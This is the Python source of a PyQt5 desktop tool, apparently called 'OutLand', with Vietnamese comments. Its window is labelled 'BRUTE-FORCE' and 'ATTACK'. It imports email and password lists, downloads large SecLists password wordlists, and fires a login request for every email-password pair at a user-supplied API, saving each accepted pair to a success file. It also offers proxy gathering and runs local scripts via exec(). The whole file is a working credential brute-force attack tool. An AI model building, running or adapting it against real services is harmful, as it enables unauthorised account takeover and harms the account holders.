import os
import sys
import requests
import json
import datetime
import re
import threading
import time
import platform

from PyQt5.QtWidgets import QApplication, QWidget, QLineEdit, QPushButton, QVBoxLayout, QHBoxLayout, QFileDialog, QComboBox, QTextEdit, QScrollArea, QLabel, QSizePolicy, QListWidget, QMessageBox
from PyQt5.QtGui import QPixmap, QPalette, QColor, QIcon, QTextCharFormat, QFont
from PyQt5.QtCore import Qt

# Khai báo biến toàn cục để lưu trữ dữ liệu sau khi import
global_data_user = []
global_data_pass = []
global_data_proxy = []


class GreetingApp(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(
            '⇢⇢⇢⇢⇢ © OutLand. All rights reserved. Version 1.0 ⇠⇠⇠⇠⇠')
        self.setFixedSize(500, 600)
        self.set_black_theme()
        self.setWindowIcon(QIcon('./images/iconlabel.png'))

        # Thêm label BRUTE-FORCE vào hàng đầu tiên của layout chính
        self.brute_force_label = QLabel('BRUTE-FORCE', self)

        # Tạo các thành phần giao diện
        self.entry = QLineEdit(self)
        self.entry.setPlaceholderText('Api target')

        # ComboBox để chọn phương thức
        self.method_combobox = QComboBox(self)
        self.method_combobox.addItems(['GET', 'POST', 'PATCH'])

        # Nút để tải dữ liệu từ URL
        self.url_button = QPushButton('ATTACK', self)

        # Nút để nhập file user hoặc email
        self.user_file_button = QPushButton(
            'Import user or email list txt file', self)
        self.user_file_tick = QLabel(self)
        self.user_file_tick.setPixmap(QPixmap(''))

        # Nút để nhập dữ liệu từ file .txt
        self.file_button = QPushButton('Import pass list txt file', self)
        self.file_tick = QLabel(self)
        self.file_tick.setPixmap(QPixmap(''))

        # Nút để nhập dữ liệu từ file proxy
        self.proxy_button = QPushButton('Import proxy list txt file', self)
        self.proxy_tick = QLabel(self)
        self.proxy_tick.setPixmap(QPixmap(''))

        # Nút Get Proxy Free
        self.get_proxy_button = QPushButton('Get Proxy Free', self)
        self.get_proxy_tick = QLabel(self)
        self.get_proxy_tick.setPixmap(QPixmap(''))

        # Nút Check Proxy Free
        self.check_proxy_button = QPushButton('Check Proxy Free', self)
        self.check_proxy_tick = QLabel(self)
        self.check_proxy_tick.setPixmap(QPixmap(''))

        # Nút Check Proxy Free
        self.get_seclists_button = QPushButton('Get SecLists Free', self)
        self.get_seclists_tick = QLabel(self)
        self.get_seclists_tick.setPixmap(QPixmap(''))

        # Nút để chọn nhập form data
        self.form_data_button = QPushButton('Form Data', self)
        # Nút để chọn nhập JSON data
        self.json_data_button = QPushButton('JSON Data', self)

        # Nhãn cho vùng nhập dữ liệu form data
        self.form_data_label = QLabel('Form Data:', self)
        self.form_data_textedit = QTextEdit(self)
        self.form_data_textedit.setPlaceholderText(
            'Enter form data here in key=value format, one per line...')

        # Nhãn cho vùng nhập dữ liệu JSON data
        self.json_data_label = QLabel('Json Data:', self)
        self.json_data_textedit = QTextEdit(self)
        self.json_data_textedit.setPlaceholderText('Enter JSON data here...')

        # Hiển thị nội dung phản hồi từ URL hoặc file
        self.response_textedit = QTextEdit(self)
        self.scroll_area = QScrollArea()  # Vùng cuộn cho QTextEdit

        main_layout = QVBoxLayout()  # Sử dụng QVBoxLayout để xếp chồng các thành phần

        # Tạo một QHBoxLayout mới để đặt các thành phần trên cùng một hàng
        top_row_layout = QHBoxLayout()
        # Thêm ô nhập URL vào hàng đầu tiên
        top_row_layout.addWidget(self.entry)
        # Thêm ComboBox chọn phương thức vào hàng đầu tiên
        top_row_layout.addWidget(self.method_combobox)
        # Thêm nút tải từ URL vào hàng đầu tiên
        top_row_layout.addWidget(self.url_button)

        # Thêm hàng đầu tiên vào layout chính
        main_layout.addLayout(top_row_layout)

        # Center the buttons in the application
        centered_layout = QVBoxLayout()
        centered_layout.setSpacing(10)
        centered_layout.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(self.brute_force_label)

        buttons = [
            (self.user_file_button, self.user_file_tick),
            (self.file_button, self.file_tick),
            (self.proxy_button, self.proxy_tick),
            (self.get_proxy_button, self.get_proxy_tick),
            (self.check_proxy_button, self.check_proxy_tick),
            (self.get_seclists_button, self.get_seclists_tick)
        ]

        for button, tick in buttons:
            hbox = QHBoxLayout()
            hbox.setAlignment(Qt.AlignCenter)
            hbox.addWidget(button)
            if tick:
                hbox.addWidget(tick)
            button.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
            centered_layout.addLayout(hbox)

        main_layout.addLayout(centered_layout)

        # Keep the Form Data and JSON Data buttons in their original place
        data_buttons_layout = QHBoxLayout()
        data_buttons_layout.addWidget(self.form_data_button)
        data_buttons_layout.addWidget(self.json_data_button)
        main_layout.addLayout(data_buttons_layout)

        # Widget để chứa các thành phần liên quan đến form data
        self.form_data_widget = QWidget()
        form_data_layout = QVBoxLayout()
        form_data_layout.addWidget(self.form_data_label)
        form_data_layout.addWidget(self.form_data_textedit)
        self.form_data_widget.setLayout(form_data_layout)
        self.form_data_widget.setVisible(False)

        # Widget để chứa các thành phần liên quan đến JSON data
        self.json_data_widget = QWidget()
        json_data_layout = QVBoxLayout()
        json_data_layout.addWidget(self.json_data_label)
        json_data_layout.addWidget(self.json_data_textedit)
        self.json_data_widget.setLayout(json_data_layout)
        self.json_data_widget.setVisible(False)

        self.close_button = QPushButton('Close Input data', self)
        self.close_button.clicked.connect(self.close_data_input)
        main_layout.addWidget(self.close_button)
        self.close_button.setVisible(False)

        # Thêm widget form data vào layout chính
        main_layout.addWidget(self.form_data_widget)
        # Thêm widget JSON data vào layout chính
        main_layout.addWidget(self.json_data_widget)

        # Thêm vùng cuộn cho QTextEdit vào layout
        main_layout.addWidget(self.scroll_area)
        # Cho phép vùng cuộn thay đổi kích thước
        self.scroll_area.setWidgetResizable(True)
        # Đặt QTextEdit vào vùng cuộn
        self.scroll_area.setWidget(self.response_textedit)
        self.setLayout(main_layout)  # Đặt layout chính cho ứng dụng

        # Kết nối các sự kiện click cho nút nhập file và nút tải từ URL
        self.user_file_button.clicked.connect(self.import_user_file)
        self.file_button.clicked.connect(self.import_pass_file)
        self.url_button.clicked.connect(self.load_from_url)
        self.form_data_button.clicked.connect(self.show_form_data_input)
        self.json_data_button.clicked.connect(self.show_json_data_input)
        self.proxy_button.clicked.connect(self.import_proxy_file)
        self.get_proxy_button.clicked.connect(self.get_proxy_free)
        self.check_proxy_button.clicked.connect(self.check_proxy_free)
        self.get_seclists_button.clicked.connect(self.get_seclists)

    def import_user_file(self):
        global global_data_user  # Khai báo sử dụng biến toàn cục
        options = QFileDialog.Options()
        # Hiển thị hộp thoại để chọn file .txt và lấy đường dẫn của file đã chọn
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Mở file user hoặc email", "", "Text Files (*.txt);;All Files (*)", options=options)
        if file_path:
            try:
                # Đọc nội dung từ file và hiển thị trên QTextEdit
                with open(file_path, 'r') as file:
                    content = file.readlines()  # Đọc từng dòng và lưu vào list
                # Gán nội dung cho biến toàn cục
                global_data_user = [line.strip() for line in content]
                # Hiển thị nội dung trên QTextEdit
                self.display_content('\n'.join(global_data_user))
                self.user_file_tick.setPixmap(
                    # Hiển thị icon tick xanh
                    QPixmap('./images/green_tick.png'))
            except Exception as e:
                self.display_content(f"Lỗi đọc file: {e}")
                self.user_file_tick.setPixmap(QPixmap(''))
        self.close_data_input()

    def import_pass_file(self):
        global global_data_pass  # Sử dụng biến toàn cục
        options = QFileDialog.Options()
        # Hiển thị hộp thoại để chọn file .txt và lấy đường dẫn của file đã chọn
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Mở file .txt", "", "Text Files (*.txt);;All Files (*)", options=options)
        if file_path:
            try:
                # Đọc nội dung từ file và hiển thị trên QTextEdit
                with open(file_path, 'r') as file:
                    content = file.readlines()  # Đọc từng dòng và lưu vào list
                # Gán nội dung cho biến toàn cục
                global_data_pass = [line.strip() for line in content]
                # Hiển thị nội dung trên QTextEdit
                self.display_content('\n'.join(global_data_pass))
                # Hiển thị icon tick xanh
                self.file_tick.setPixmap(
                    QPixmap('./images/green_tick.png'))
            except Exception as e:
                self.display_content(f"Lỗi đọc file: {e}")
                # Xóa icon tick nếu có lỗi
                self.file_tick.setPixmap(QPixmap(''))
        self.close_data_input()

    def import_proxy_file(self):
        global global_data_proxy  # Sử dụng biến toàn cục
        options = QFileDialog.Options()
        # Hiển thị hộp thoại để chọn file .txt và lấy đường dẫn của file đã chọn
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Mở file .txt", "", "Text Files (*.txt);;All Files (*)", options=options)
        if file_path:
            try:
                # Đọc nội dung từ file và hiển thị trên QTextEdit
                with open(file_path, 'r') as file:
                    content = file.readlines()  # Đọc từng dòng và lưu vào list
                # Gán nội dung cho biến toàn cục
                global_data_proxy = [line.strip() for line in content]
                # Hiển thị nội dung trên QTextEdit
                self.display_content('\n'.join(global_data_proxy))
                # Hiển thị icon tick xanh
                self.proxy_tick.setPixmap(
                    QPixmap('./images/green_tick.png'))
            except Exception as e:
                self.display_content(f"Lỗi đọc file: {e}")
                # Xóa icon tick nếu có lỗi
                self.proxy_tick.setPixmap(QPixmap(''))
        self.close_data_input()

    def load_from_url(self):
        global global_data_user  # Khai báo sử dụng biến toàn cục
        global global_data_pass  # Khai báo sử dụng biến toàn cục
        global global_data_proxy  # Khai báo sử dụng biến toàn cục
        # Lấy phương thức được chọn từ ComboBox
        method = self.method_combobox.currentText()
        url = self.entry.text()  # Lấy URL từ ô nhập URL
        headers = {  # Thiết lập header cho yêu cầu POST hoặc PATCH
            'Content-Type': 'application/x-www-form-urlencoded'}

        if url:
            try:
                if global_data_user and global_data_pass:
                    listPosts = []
                    successful_data = []
                    output_directory = "./output"

                    # Tạo thư mục output nếu nó chưa tồn tại
                    os.makedirs(output_directory, exist_ok=True)

                    # Tạo danh sách các post data từ user và password
                    for user in global_data_user:
                        for password in global_data_pass:
                            form_data = {
                                'email': user,
                                'password': password
                            }
                            listPosts.append(form_data)

                    # Gửi các yêu cầu POST hoặc PATCH với dữ liệu đã tạo
                    for postData in listPosts:
                        try:
                            if method.upper() == 'POST':
                                response = requests.post(
                                    url, data=postData, headers=headers)
                            elif method.upper() == 'PATCH':
                                response = requests.patch(
                                    url, data=postData, headers=headers)
                            else:
                                self.display_content(
                                    "Method not supported. Use 'POST' or 'PATCH'.")
                                continue  # Bỏ qua vòng lặp hiện tại và chuyển sang postData tiếp theo

                            # Kiểm tra trạng thái code của phản hồi
                            if 200 <= response.status_code < 300:
                                successful_data.append(postData)

                        except Exception as e:
                            self.display_content(
                                f"An error occurred: {str(e)}")
                            continue  # Bỏ qua vòng lặp hiện tại và chuyển sang postData tiếp theo

                    # Lưu dữ liệu của successful_data vào file success.txt
                    if successful_data:
                        output_file_path = os.path.join(
                            output_directory, "success.txt")
                        with open(output_file_path, "w") as output_file:
                            for data in successful_data:
                                output_file.write(str(data) + "\n")

                        text = f"Dữ liệu thành công lưu vào file: {output_file_path}\nData thành công:\n {successful_data}"
                        self.display_content(text)
                    else:
                        self.display_content(
                            "Không có dữ liệu thành công sau khi brute-force...")
                else:
                    if method.upper() == 'GET':
                        response = requests.get(url)
                    elif method.upper() in ['POST', 'PATCH']:
                        if self.form_data_widget.isVisible():
                            form_data = self.form_data_textedit.toPlainText().strip()  # Lấy dữ liệu Form
                            if not form_data:
                                self.display_content(
                                    "Vui lòng nhập dữ liệu form...")
                                return
                            # Chuyển đổi dữ liệu form từ định dạng text sang dictionary
                            form_data_dict = dict(line.split(
                                '=') for line in form_data.splitlines() if '=' in line)
                            # Thiết lập header cho yêu cầu POST hoặc PATCH
                            headers = {
                                'Content-Type': 'application/x-www-form-urlencoded'}
                            if method.upper() == 'POST':
                                response = requests.post(
                                    url, data=form_data_dict, headers=headers)
                            else:
                                response = requests.patch(
                                    url, data=form_data_dict, headers=headers)
                        elif self.json_data_widget.isVisible():
                            json_data = self.json_data_textedit.toPlainText().strip()  # Lấy dữ liệu JSON
                            if not json_data:
                                self.display_content(
                                    "Vui lòng nhập dữ liệu JSON...")
                                return
                            # Thiết lập header cho yêu cầu POST hoặc PATCH
                            headers = {'Content-Type': 'application/json'}
                            if method.upper() == 'POST':
                                response = requests.post(
                                    url, data=json_data, headers=headers)
                            else:
                                response = requests.patch(
                                    url, data=json_data, headers=headers)
                        else:
                            self.display_content(
                                "Vui lòng chọn loại dữ liệu cần gửi...")
                            return
                    else:
                        self.display_content("Phương thức không hợp lệ")
                        return
                    response.raise_for_status()  # Nếu có lỗi trong phản hồi, ném ra ngoại lệ
                    content = response.text  # Lấy nội dung của phản hồi
                    # Hiển thị nội dung trên QTextEdit
                    self.display_content(content)
            except requests.exceptions.RequestException as e:
                self.display_content(f"Lỗi tải URL: {e}")
        else:
            self.display_content(f"Vui lòng nhập URL...")

    def display_content(self, content):
        # Hiển thị nội dung theo text mặc định
        # self.response_textedit.setPlainText(content)
        ####################
        # Hiển thị nội dung theo QTextCharFormat với style mong muốn
        format = QTextCharFormat()
        format.setForeground(QColor('green'))
        format.setFontWeight(QFont.Bold)
        self.response_textedit.setCurrentCharFormat(format)
        self.response_textedit.setPlainText(content)
        ####################
        # Thiết lập HTML cho QTextEdit để áp dụng CSS
        # data_list = content.split()
        # result = '\n'.join(data_list)
        # html_content = f"<span style='color:red; font-weight:bold'>{result}</span>"
        # self.response_textedit.setHtml(html_content)

    def show_form_data_input(self):
        global global_data_user  # Khai báo sử dụng biến toàn cục
        global global_data_pass  # Khai báo sử dụng biến toàn cục
        self.form_data_widget.setVisible(True)
        self.json_data_widget.setVisible(False)
        self.close_button.setVisible(True)
        ######
        self.user_file_tick.clear()
        self.file_tick.clear()
        global_data_user = []
        global_data_pass = []

    def show_json_data_input(self):
        global global_data_user  # Khai báo sử dụng biến toàn cục
        global global_data_pass  # Khai báo sử dụng biến toàn cục
        self.form_data_widget.setVisible(False)
        self.json_data_widget.setVisible(True)
        self.close_button.setVisible(True)
        ######
        self.user_file_tick.clear()
        self.file_tick.clear()
        global_data_user = []
        global_data_pass = []

    def close_data_input(self):
        if self.form_data_widget.isVisible():
            self.form_data_widget.setVisible(False)
        if self.json_data_widget.isVisible():
            self.json_data_widget.setVisible(False)
        self.close_button.setVisible(False)

    def set_black_theme(self):
        # Thiết lập stylesheet cho ứng dụng
        style_sheet = """
            QPushButton {
                background-color: gray; /* Màu xanh da trời */
                color: white;
                font-weight: bold;
            }
            QLabel {
                color: white;
                font-weight: bold;
            }
        """
        # Thiết lập stylesheet cho ứng dụng
        self.setStyleSheet(style_sheet)
        # Thiết lập màu nền cho cửa sổ
        pal = self.palette()
        pal.setColor(QPalette.Window, QColor(0, 0, 0))
        self.setPalette(pal)

    def get_proxy_free(self):
        self.display_content("Đang tải Proxy...")
        exec(open("./scripts/getproxy.py").read())
        self.display_content(
            "Proxy tải thành công và lưu vào thư mục outputproxy...")
        self.get_proxy_tick.setPixmap(
            QPixmap('./images/green_tick.png'))

    def check_proxy_free(self):
        self.display_content("Đang checker list Proxy...")
        exec(open("./scripts/checkproxy.py").read())
        self.display_content(
            "Check Proxy hoàn tất, lưu vào thư mục outputproxy...")
        self.check_proxy_tick.setPixmap(
            QPixmap('./images/green_tick.png'))

    def get_seclists(self):
        # Tạo một cửa sổ pop-up
        self.popup = QWidget()
        self.popup.setWindowTitle('Downloadable Lists')
        # Tạo QListWidget để hiển thị danh sách
        self.list_widget = QListWidget()
        self.list_widget.addItems(
            ["ignis-100K", "ignis-10K", "ignis-1K", "ignis-1M", "ignis-10M"])
        # Thiết lập layout cho pop-up
        layout = QVBoxLayout()
        layout.addWidget(self.list_widget)
        self.popup.setLayout(layout)
        # Kết nối sự kiện khi một mục được chọn
        self.list_widget.itemClicked.connect(self.on_item_clicked)
        self.popup.show()

    def on_item_clicked(self, item):
        # Lấy văn bản của mục được chọn
        selected_item_text = item.text()

        # Tạo hàm để thực hiện tải xuống và xử lý kết quả
        def download_and_handle(url):
            try:
                # Thực hiện yêu cầu GET đến URL để tải xuống
                response = requests.get(url)
                # Kiểm tra nếu yêu cầu thành công
                if response.status_code == 200:
                    # Mở file để ghi dữ liệu nhận được
                    with open(f"./outputSeclists/{selected_item_text}.txt", "wb") as f:
                        f.write(response.content)
                    # Hiển thị thông báo tải xuống thành công
                    QMessageBox.information(
                        self.popup, "Hoàn Tất", "Download file thành công.", QMessageBox.Ok)
                    self.popup.close()
                else:
                    # Hiển thị thông báo nếu yêu cầu không thành công
                    QMessageBox.critical(
                        self.popup, "Lỗi", f"Download file thất bại: Trạng thái code {response.status_code}", QMessageBox.Ok)
                    self.popup.close()
            except Exception as e:
                # Hiển thị thông báo nếu có lỗi trong quá trình tải xuống
                QMessageBox.critical(
                    self.popup, "Error", f"Download file thất bại: {str(e)}", QMessageBox.Ok)
                self.popup.close()

        # Kiểm tra xem mục được chọn là gì và thực hiện tải xuống
        if selected_item_text == "ignis-100K":
            download_and_handle(
                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Pwdb-Public/Wordlists/ignis-100K.txt")
        elif selected_item_text == "ignis-10K":
            download_and_handle(
                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Pwdb-Public/Wordlists/ignis-10K.txt")
        elif selected_item_text == "ignis-1K":
            download_and_handle(
                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Pwdb-Public/Wordlists/ignis-1K.txt")
        elif selected_item_text == "ignis-1M":
            download_and_handle(
                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Pwdb-Public/Wordlists/ignis-1M.txt")
        elif selected_item_text == "ignis-10M":
            download_and_handle(
                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Pwdb-Public/Wordlists/ignis-10M.txt")


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = GreetingApp()
    window.show()
    sys.exit(app.exec_())
